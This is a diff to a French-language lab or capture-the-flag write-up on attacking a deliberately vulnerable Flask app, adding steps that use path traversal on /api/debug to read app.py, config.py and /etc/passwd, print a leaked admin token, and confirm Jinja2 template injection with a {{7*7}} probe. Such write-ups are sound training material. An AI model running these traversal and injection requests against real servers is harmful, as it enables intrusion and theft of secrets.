@@ -106,7 +106,7 @@ En inspectant le code source de la page on tombe sur des indices qui peuvent etr
 
 On va prendre les commentaires HTML dans l'ordre :  
 
-1. *Piste 1* `<!-- TODO: remove /api/debug before launch -->`  
+##### 1. *Piste 1* `<!-- TODO: remove /api/debug before launch -->`  
 
 ```html
 ┌──(kali㉿kali)-[~]
@@ -178,7 +178,7 @@ ______________
 - halrev
 ```
 
-Dans la piste 2, il est mentionne `Jinja2`, je connaissais pas, c'est un moteur de templating Python. N'ayant jamais fait de Python, j'ai dig un peu avec le frero GPT qui m'a donne une architecture plutot commune pour un serveur Python/Flask :  
+Dans la [piste 2](#2-piste-2----debugjs-still-in-staticjs-pls-remove---), il est mentionne `Jinja2`, je connaissais pas, c'est un moteur de templating Python. N'ayant jamais fait de Python, j'ai dig un peu avec le frero GPT qui m'a donne une architecture plutot commune pour un serveur Python/Flask :  
 ```
 /opt/app/
 ├── app.py
@@ -250,11 +250,31 @@ app:app
 [Source : Red Hat](https://docs.redhat.com/fr/documentation/red_hat_enterprise_linux/4/html/reference_guide/s2-proc-cmdline).  
 
 - Avec cette requete : `curl http://10.0.2.2:5042/api/debug?file=../../../../var/www/hal9042/app.py `
-=> on peut donc obtenir le code source de l'application. [Cliquez-ici](./utils/python/app.py)
+=> on peut obtenir le code source de l'application. [Cliquez-ici](./utils/python/app.py)
 
+- Avec cette requete : `curl http://10.0.2.2:5042/api/debug?file=../../../../var/www/hal9042/config.py` 
+=> on peut obtenir la config de l'application. [Cliquez-ici](./utils/python/config.py)
 
+### La lecture du code source `app.py` nous permet de : 
 
-2. *Piste 2* `<!-- debug.js still in /static/js/ pls remove -->`
+#### Confirmer la LFI + execution de commande avec token auth:
+```python
+# code tire de app.py
+path = os.path.join(APP_ROOT, f)
+```
+Detail important tout de meme : si `f` est un chemin absolu, `os.join.path` ignore `APP_ROOT` et utilise directement ce chemin, il n'y a donc pas besoin de faire de *path traversal* avec `../`, on peut filer direct `?file=/etc/passwd`
+
+- Dans le fichier de config, on recupere le token `<maintenance_token>` : 
+```python
+# Internal maintenance token. The /api/debug console accepts this token to run
+# diagnostic commands. Was supposed to be rotated before launch.
+ADMIN_TOKEN = "h4l_d3bug_t0k3n_2024"
+```
+- La possibilite d'executer une commande arbitraire cote serveur represente une vulnerabilite web, demandee par le sujet. `TODO :` **On creusera apres la reconnaissance.**
+
+#### Decouvrir une autre vulnerabilite : SSTI (Server Side Template Injection) sur `/evaluate`
+
+##### 2. *Piste 2* `<!-- debug.js still in /static/js/ pls remove -->`
 
 ```js
 ┌──(kali㉿kali)-[~]
@@ -271,9 +291,63 @@ window.HAL_DEBUG = {
     debug_endpoint: "/api/debug",
     note: "X-Debug-Render: true  ->  see what the template engine actually rendered"
 };
+```
+
+On va reprendre d'ici pour la suite, car la lecture du code source `app.py` nous a permis de comprendre la vulnerabilite existante sur Jinja2. 
+
+1. Le fonctionnement de `Jinja2` : en regle generale, Flask utilise `Jinja2` pour generer les pages HTML, l'idee est en fait : 
+```json
+<Template prepare> + <entree user> = page generee complete :
+
+Template : "Project under evaluation: {{name}}"
+Entree utilisateur : "Minishell"
+Page generee complete : "Project under evaluation: Minishell"
+```
+
+C'est ce qui se passe dans `app.py` : 
+```python
+name = request.form.get("project_name", "") or request.args.get("project_name", "")
+```
+`name` contient donc directement l'entree user.  
+
+La vulnerabilite se situe ici :
+```python
+render_template_string("Project under evaluation: " + name)
+```
+Dans les faits : 
+```python
+"Project under evaluation " + <entree user>
+              |
+              V
+      Nouveau template
+              |
+              V
+      render_template_string()
+```
+
+L'article consacre aux `SSTI` de [PortSwigger](https://portswigger.net/web-security/server-side-template-injection) decrit ce pattern : *une entree utilisateur est concatenee a une chaine qui devient ensuite le template interprete par le moteur.*  
+
+2. `Jinja2` a une syntaxe a respecter pour demander au moteur d'evaluer une expression : `{{ ... }}` => [Source](https://jinja.palletsprojects.com/en/stable/templates/)
+
+Pour confirmer la vulnerabilite, on va jouer le test de base qui nous est donne dans l'article de PortSwigger : 
+
+```bash
+curl -X POST http://10.0.2.2:5042/evaluate \
+-H "X-Debug-Render: false" \
+-d "project_name={{7*7}}"
 ```  
+Output : `submission received. HAL9042 will evaluate shortly.`
 
-
-
-
-## Troubleshooting
+Il nous faut passer le `X-Debug-Render` a true pour que le resultat puisse etre observe : 
+```python
+if request.headers.get("X-Debug-Render", "").lower() == "true":
+        return Response(rendered + "\n", mimetype="text/plain")
+```  
+Avec `X-Debug-Render` a `true` : 
+```bash
+┌──(kali㉿kali)-[~]
+└─$ curl -X POST http://10.0.2.2:5042/evaluate \
+-H "X-Debug-Render: true" \
+-d "project_name={{7*7}}"
+Project under evaluation: 49
+```
